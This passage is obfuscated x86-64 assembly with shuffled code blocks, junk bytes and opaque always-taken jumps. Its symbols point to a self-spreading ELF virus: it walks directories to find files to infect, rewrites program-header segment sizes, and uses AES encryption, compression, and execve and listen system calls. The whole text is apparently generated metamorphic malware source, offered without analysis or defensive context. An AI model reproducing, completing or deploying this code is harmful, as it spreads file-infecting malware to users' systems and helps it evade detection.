..@qxfmQsvP2cJ0:
    push        rdi
    jmp         $+4
db 0xde, 0x0b
    je          ..@SknhZWS2CtP8
    jne         ..@SknhZWS2CtP8
..@sGy242gKXS6X:
    call        Aes256Encryption
    jl          ..@U0GWr8zeoBO9
    jge         ..@U0GWr8zeoBO9
..@apUm8aZ1rjZU:
    mov         rax, rax
    jmp         $+4
db 0x2e, 0x1d
    jb          ..@RXJ3sAvCGguu
    jae         ..@RXJ3sAvCGguu
..@YbXghfMFSOf1:
    mov         rbx, rbx
    jmp         $+3
db 0x9a
    jmp         ..@pEN3FVFdl4eW
..@WZ9Y8sxWwaIn:
    rep         nop
    jl          ..@fHeTOmWKIs8k
    jge         ..@fHeTOmWKIs8k
..@nhEkL9DfS1Fn:
    lea         r3, [rsp+_PAYLOAD_OFF.key]
    jmp         $+3
db 0xa8
    jmp         ..@sGy242gKXS6X
..@EDR6iNcRqE4E:
    xor         r1, r1
    jmp         $+3
db 0xe7
    jl          ..@NytjjNOqsSVu
    jge         ..@NytjjNOqsSVu
..@3mjJfaSxvTNV:
%ifdef X86_64
    xor         rax, rax
%endif
    jmp         $+4
db 0xee, 0xdb
    js          ..@9IawNLe9vrYQ
    jns         ..@9IawNLe9vrYQ
..@sFmwgYBe8dHl:
    mov         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    jl          ..@abPvIXlT5EIB
    jge         ..@abPvIXlT5EIB
..@5xf4XMQEAKMA:
    mov         rdi, m6
    js          ..@DZEXLvH6BGrJ
    jns         ..@DZEXLvH6BGrJ
..@bSzxKCEvNLXy:
    push        rdi
    jl          ..@fugAOmmmslnM
    jge         ..@fugAOmmmslnM
..@RGMt6lmcdTcQ:
    add         WORD [rsp+_LZSSE_OFF.w_index], ax
    je          ..@6RknKFNxs7jI
    jne         ..@6RknKFNxs7jI
..@0Lf94gvwjwGM:
    pop         rax
    jmp         $+5
db 0xd6, 0x50, 0x79
    jl          ..@lZtHnhgsGpi3
    jge         ..@lZtHnhgsGpi3
..@XM8vU8RV1Gxk:
    pop         rcx
    jmp         $+3
db 0x5e
    jmp         $+3
db 0xea
    jl          ..@jXKe1AfFPoov
    jge         ..@jXKe1AfFPoov
..@WQkrUrY1emfp:
    OFILE       [r1], 0x10000
    jmp         ..@VXzYLYTswDhR
..@jEf2L27wj4YY:
    pop         rbp
    jl          ..@cYP3m13dZxlR
    jge         ..@cYP3m13dZxlR
..@5xqStU0Fovyw:
    pop         rsi
    js          ..@PAVBuJdabG5Y
    jns         ..@PAVBuJdabG5Y
..@WJLB4U3wl1xn:
    xor         rcx, rcx
    jmp         ..@ifJJP5InOJiA
..@kGw56hI4BaJP:
    xor         r2, r2
    jl          ..@opG6Nc17svAw
    jge         ..@opG6Nc17svAw
..@172WAaP5UMvP:
    mov         eax, 0x20
    jmp         $+3
db 0x7a
    jmp         ..@Zuf6DsqGJyDc
..@L1N2BSfCbowM:
    push        rbx
    jb          ..@eXZ5rItjc4Na
    jae         ..@eXZ5rItjc4Na
..@27WyW3zM7jgh:
    jnz         ..@YtUcgTxfgnnH
    jmp         $+5
db 0x50, 0xd1, 0x09
    jmp         ..@KoOALeAJirev
..@etk0RKy7KiSc:
    mov         QWORD [rsp+_NBF_OFF.file], r1
    js          ..@g9jl1G9S8e1A
    jns         ..@g9jl1G9S8e1A
..@efy1f9ZifXOi:
    push        rsi
    jmp         $+4
db 0xc2, 0xf6
    jmp         $+5
db 0xae, 0x3c, 0x9e
    jb          ..@fDHN0DuHJocY
    jae         ..@fDHN0DuHJocY
..@WksEF28HtRJn:
    mov         bl, BYTE [rsp+_LZSSE_OFF.character]
    jmp         ..@NFm6gDuxAdEg
..@YtUcgTxfgnnH:
    xchg        rcx, rcx
    jb          ..@6NnXPb3yTVY9
    jae         ..@6NnXPb3yTVY9
..@ITaS7IpEGp6H:
    push        rsi
    jmp         ..@SVmRU8NE6mIE
..@4IEHkxViBsL4:
    push        rcx
    jmp         $+3
db 0x07
    jmp         $+4
db 0x8a, 0xe9
    je          ..@ogXDmZMO1xly
    jne         ..@ogXDmZMO1xly
..@KVMOVDO84E5z:
    aesenc      xmm0, xmm1
    jmp         ..@eJNhj314uWWr
..@MR6AQQABZc53:
%ifdef X86_32
    mov         edi, 0xffffffff
%endif
    jmp         $+3
db 0xc4
    jmp         $+5
db 0xdc, 0x18, 0x72
    je          ..@B7lk9e4VoM6a
    jne         ..@B7lk9e4VoM6a
..@0KgPfZxPY5YK:
    mov         rax, SYS_PRCTL
    jmp         ..@gaGUSGY6yZ4h
..@UhBIGyFE84jJ:
    aesenc      xmm0, xmm1
    jmp         ..@KTGllJUv60tz
..@y4jNEStpYLOP:
    mov         rsi, rsi
    jb          ..@27WyW3zM7jgh
    jae         ..@27WyW3zM7jgh
..@4m6CD1hUe7FO:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    js          ..@K4uhgUfiFltQ
    jns         ..@K4uhgUfiFltQ
..@C8DiHx8p02qd:
    pop         rsi
    jmp         $+3
db 0x6f
    jmp         ..@LrBn3Tr3FdT8
..@e1IagOzOPG1c:
    cmp         rax, (-1)
    jmp         $+5
db 0xb8, 0x32, 0xc6
    jmp         ..@CT7stcqvPkv1
..@Cnw5FeuSCxA2:
    jmp         Strcpy
    jmp         $+5
db 0xf9, 0x93, 0x3b
    jl          ..@8Zx8XzpL8H3d
    jge         ..@8Zx8XzpL8H3d
..@3wIHiSEpl6Q5:
    pop         rbx
    je          ..@sZP07JSynCTT
    jne         ..@sZP07JSynCTT
..@XzK0xkuGbZhA:
    pop         rsi
    jmp         $+3
db 0x6f
    jb          ..@3Q8CDGgEgd30
    jae         ..@3Q8CDGgEgd30
..@ybOTtCkc5sos:
    mov         QWORD [r2+p_h.p_filesz], r4
    jmp         ..@E8Op7julZzNA
..@FRU0vwEVStYl:
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    jl          ..@4iL6rcIY6vWc
    jge         ..@4iL6rcIY6vWc
..@ZrfQifcLChzl:
    cmp         BYTE [r1], '.'
    jmp         $+3
db 0xc6
    jmp         ..@Fj5NRrUHwNQW
..@NVTvzST75iFs:
    pop         rdi
    jb          ..@9fjHaBbhrUA3
    jae         ..@9fjHaBbhrUA3
..@lG2do00ppE3p:
    pop         rbx
    jmp         ..@HyntCeZJzDQm
..@U0GWr8zeoBO9:
    xchg        rdi, rdi
    jmp         $+3
db 0x2f
    jl          ..@X7c2ahY4hoZY
    jge         ..@X7c2ahY4hoZY
..@d0Lua9UkxTdk:
    mov         rcx, rcx
    jmp         $+5
db 0x0b, 0x72, 0x88
    jl          ..@JL7R0U9SI2eC
    jge         ..@JL7R0U9SI2eC
..@GND3L3k9PPNn:
    cmp         r2, 0
    jmp         $+5
db 0xf6, 0x11, 0x54
    jmp         $+4
db 0x46, 0x5b
    je          ..@X7cGr2NKFuHw
    jne         ..@X7cGr2NKFuHw
..@rhyL1qpgArUs:
    jnz         ..@ZcJZqhnAUXGj
    jmp         $+5
db 0x79, 0x23, 0x1d
    je          ..@EThTyQUN9xCO
    jne         ..@EThTyQUN9xCO
..@DrNgAHjaKfRD:
    xchg        rsp, rsp
    jmp         ..@q41ZDLRBGhND
..@SdWDlyTyjNkO:
    xor         rbx, rbx
    jmp         $+3
db 0x7e
    je          ..@Jy87f4xEzl7A
    jne         ..@Jy87f4xEzl7A
..@x1eKWHumYhN8:
    mov         rax, r4
    jl          ..@FK3Nl0zg1b0X
    jge         ..@FK3Nl0zg1b0X
..@1P40QhihGOta:
    pop         rsi
    jmp         $+4
db 0xaa, 0x3f
    jmp         ..@cTzxoOuMrHa2
..@NamG2rJrRGZP:
    pop         rdi
    jb          ..@OwQLqk02S9BO
    jae         ..@OwQLqk02S9BO
..@E8Op7julZzNA:
    mov         QWORD [r2+p_h.p_memsz], r4
    jmp         $+5
db 0x85, 0x79, 0x8d
    jmp         ..@Pz3xCMBAvZbp
..@HyntCeZJzDQm:
    push        rdx
    jmp         $+5
db 0x89, 0xb2, 0x40
    je          ..@onbhSH0DV2oI
    jne         ..@onbhSH0DV2oI
..@WddXMgLF8tWR:
    sub         rsp, _VADDR_OFF_size
    je          ..@ob2uLfXsnMyM
    jne         ..@ob2uLfXsnMyM
..@0ui5zz4ko2J6:
    push        rdi
    jl          ..@vXl3IEEWBPEN
    jge         ..@vXl3IEEWBPEN
..@Vz5f0gEeRxBq:
    add         rdi, rbx
    jl          ..@ZQGBlfPjQctA
    jge         ..@ZQGBlfPjQctA
..@q7t9bpdkltuJ:
    lea         r1, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         $+5
db 0xba, 0x6b, 0x21
    jmp         ..@ZrfQifcLChzl
..@IXS4QOynWUyR:
    mov         r2, 0x1
    jmp         ..@lc1Kq4q2BviB
..@yFl2EUcrMSwc:
    push        rdi
    jmp         ..@pvxMot34v5MC
..@pjHkcyOJ3gDN:
    test        al, al
    jb          ..@yGpnahbbI7eh
    jae         ..@yGpnahbbI7eh
..@jm2oVjVoVuwo:
    xor         rax, rax
    jmp         ..@wCv8shobRqPv
..@8WizTwe3SOHy:
%ifdef X86_64
    xchg        rsp, rsp
%endif
    jmp         $+3
db 0xdd
    jmp         ..@v5CyJp6Toobg
..@8o9O6LZr4jZy:
    mov         DWORD [rdi], esi
    js          ..@w1YgcC5FrxLR
    jns         ..@w1YgcC5FrxLR
..@fcnXiMVH1MvK:
%ifdef X86_32
    mov         esi, r2
%endif
    jmp         $+3
db 0x5d
    jl          ..@5c9hwabEtH8l
    jge         ..@5c9hwabEtH8l
..@3OVYbALb6hVW:
    pop         r4
    jl          ..@Cl6vx5p1C081
    jge         ..@Cl6vx5p1C081
..@zxqbT8BesngC:
    xor         rax, rax
    jmp         $+3
db 0xb6
    jl          ..@dgnJdm1Vnwn7
    jge         ..@dgnJdm1Vnwn7
..@Tb622CZ7Tjei:
    add         rsi, rdx
    js          ..@7zVtaUOrqfWo
    jns         ..@7zVtaUOrqfWo
..@QC4XLs4EVJIN:
    push        rsi
    jmp         $+5
db 0x7e, 0xbd, 0x68
    je          ..@Jxt04WsWnata
    jne         ..@Jxt04WsWnata
..@pjOkE8og55RS:
    OFILE       [r5], 0x0
    js          ..@A8k7c1grmqk3
    jns         ..@A8k7c1grmqk3
..@Ijg9vg0nOmdV:
    mov         eax, SYS_EXECVE
    jb          ..@KuNs1R36MEYm
    jae         ..@KuNs1R36MEYm
..@nasRf8nPB5Sv:
    cmp         WORD [rsp+_LZSSE_OFF.la_index], ax
    jmp         $+3
db 0xa4
    jmp         $+4
db 0xca, 0xc9
    jmp         $+5
db 0xfc, 0xb1, 0x08
    jmp         $+3
db 0x7d
    jmp         $+5
db 0x26, 0x8f, 0x3f
    js          ..@sFSEulpEpkvU
    jns         ..@sFSEulpEpkvU
..@jCu1xLJBtpS2:
    mov         r1, r4
    jmp         ..@eeBeOQlObxsy
..@ablz2y0XKAAA:
    mov         rax, rax
    jb          ..@t3RqAmJCBfDD
    jae         ..@t3RqAmJCBfDD
..@CV82TCRqEbKO:
    xchg        rdx, rdx
    jl          ..@2vk0H8Zve3lK
    jge         ..@2vk0H8Zve3lK
..@CW7sMnBi6OEV:
    pop         rax
    jmp         $+5
db 0xbe, 0x51, 0xe7
    je          ..@v87sn041A4Oe
    jne         ..@v87sn041A4Oe
..@8lJUrwKpJbSt:
    push        rcx
    jl          ..@3yN85hFEe0ub
    jge         ..@3yN85hFEe0ub
..@kYWxcAS8yHle:
    pop         rdi
    js          ..@1e7m2LSY8PLD
    jns         ..@1e7m2LSY8PLD
..@CvqldWChfSE5:
    push        rax
    jmp         $+5
db 0x78, 0xe5, 0x6a
    jmp         $+3
db 0xf7
    jb          ..@88Ji0CTfS3jF
    jae         ..@88Ji0CTfS3jF
..@q5hjZh9JoXhH:
    mov         rdi, rdi
    jmp         $+3
db 0xe1
    jmp         $+4
db 0xbd, 0x1b
    jmp         ..@eqxvOBo5u1nu
..@IcYOG88M4qq0:
    xchg        rdi, rdi
    jmp         $+5
db 0xa9, 0x57, 0xf6
    jl          ..@ZZ3gvmph2CRn
    jge         ..@ZZ3gvmph2CRn
..@CCfcntb545nO:
    push        rdi
    jmp         ..@6vsrQsL5w2FA
..@1AX76Hw7VESY:
    mov         rdi, rdi
    js          ..@C3En2TpEKnRI
    jns         ..@C3En2TpEKnRI
..@0WMTYRTS0pti:
    pop         rsi
    jb          ..@V0drTOq1wzvd
    jae         ..@V0drTOq1wzvd
..@Mwj2w3QLberv:
    mov         BYTE [rsp+_INFDIR_OFF.depth], r2b
    jmp         ..@CYwfRyJX2DGX
..@Lpkld0ZRsSXs:
    mov         r3d, 0x6
    jmp         $+4
db 0xce, 0x37
    jmp         $+5
db 0x0e, 0x2c, 0xb2
    jmp         $+4
db 0xa7, 0x21
    jl          ..@DfIQ3OTkMSRL
    jge         ..@DfIQ3OTkMSRL
..@am4SbSYMG3AE:
    jnz         ..@ZcJZqhnAUXGj
    jmp         $+4
db 0x6b, 0xa7
    jb          ..@OIo3kTj6LdCm
    jae         ..@OIo3kTj6LdCm
..@CIxFJTAK5uzH:
    je          ..@EThTyQUN9xCO
    jmp         $+4
db 0x09, 0xdb
    jmp         ..@nzVnzAZHFHmo
..@SAsjbWMtVDvK:
    jmp         ..@yuPyXGLhXWq0
    jmp         $+3
db 0x9c
    jmp         ..@4MmuqMVVmXA4
..@MmmT2Yc2mLLn:
    pop         r1
    jmp         $+3
db 0x12
    js          ..@K9cCOMQjhXV4
    jns         ..@K9cCOMQjhXV4
..@9UEXZX4q2q3X:
    mov         rdx, rdx
    js          ..@ur2w69sw79wK
    jns         ..@ur2w69sw79wK
..@BkPx7GljGyUu:
    pop         rax
    jl          ..@DM1T28vVxBfE
    jge         ..@DM1T28vVxBfE
..@N8ghwH5We6hU:
    mov         ecx, WINDOW_LENGTH
    js          ..@jIOnb59A9TZI
    jns         ..@jIOnb59A9TZI
..@UnWXN5KKV4Ok:
    pop         rdx
    jmp         $+3
db 0xb9
    js          ..@oqMU5axGPPwk
    jns         ..@oqMU5axGPPwk
..@6Saofty61W1j:
    mov         r5, r1
    jmp         $+3
db 0x8e
    jmp         $+3
db 0x5a
    jmp         $+4
db 0x92, 0xa8
    js          ..@RfRKpZfVgFYj
    jns         ..@RfRKpZfVgFYj
..@MGMvDXCyVFac:
    push        r5
    jmp         $+4
db 0x3a, 0x40
    jmp         ..@EQDj8CuvRFdg
..@bcajXCSEbyKL:
    call        WORDToDWORDASCII
    jl          ..@uCnZAblX6Bq1
    jge         ..@uCnZAblX6Bq1
..@HVkqq6DsEioi:
    jmp         ..@jm2oVjVoVuwo
    jmp         $+4
db 0x88, 0x24
    js          ..@jm2oVjVoVuwo
    jns         ..@jm2oVjVoVuwo
..@PvmRGoQ0WBlP:
    pop         r1
    jmp         ..@a5w1cL2YSEK4
..@m9BeiZfsM4ss:
    mov         QWORD [r5+file.fileptr], rax
    je          ..@OBeTrbQBo4J2
    jne         ..@OBeTrbQBo4J2
..@A2ObgkaPaV0X:
    add         rdi, rax
    jmp         $+3
db 0x50
    js          ..@8dF9pQStAvSL
    jns         ..@8dF9pQStAvSL
..@scjiBnJP1Bbc:
    mov         r1, m6
    jmp         $+4
db 0xe0, 0xfa
    js          ..@gC38aGmqMQyi
    jns         ..@gC38aGmqMQyi
..@mwXmhRdA4ZiR:
    mov         eax, SYS_LISTEN
    jmp         $+3
db 0x1d
    jl          ..@N6fmq7zrn975
    jge         ..@N6fmq7zrn975
..@L5ORRbuMh1DU:
    mov         QWORD [rsp+_INFDIR_OFF.dirnread], rax
    js          ..@1HTBJqpob05T
    jns         ..@1HTBJqpob05T
..@iot82vC3Kojm:
    xchg        rdi, rdi
    jmp         $+5
db 0x0e, 0xf9, 0x8b
    jmp         ..@lG0mAR0Oku2C
..@e7BWB3LQcYCB:
    ret
    jmp         $+5
db 0x25, 0x8f, 0x01
    jl          ..@Xa0QsT7M7B3C
    jge         ..@Xa0QsT7M7B3C
..@tXhCESow0a4v:
    je          ..@4FIVBMQ4t7E7
    jb          ..@jwMxP23s6Ra3
    jae         ..@jwMxP23s6Ra3
..@WUb5ugFkI9uu:
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         $+4
db 0x01, 0x5e
    jl          ..@dE6tUP7RVxCI
    jge         ..@dE6tUP7RVxCI
..@fZ0raV5JIwc4:
    leave
    jmp         $+5
db 0xad, 0xb3, 0xbe
    jmp         $+5
db 0x98, 0x23, 0x6d
    jmp         $+3
db 0x91
    jmp         ..@X8H9MHKSlJEZ
..@7Csb9M8O6HEW:
    mov         rax, rax
    jmp         $+3
db 0x33
    jmp         ..@pgTtfgID61lc
..@hxKU23ZfqSzL:
%ifdef X86_64
    push        rcx
%endif
    jmp         $+5
db 0x24, 0xac, 0xb2
    jb          ..@ia9UySb1GT5Q
    jae         ..@ia9UySb1GT5Q

_eof:

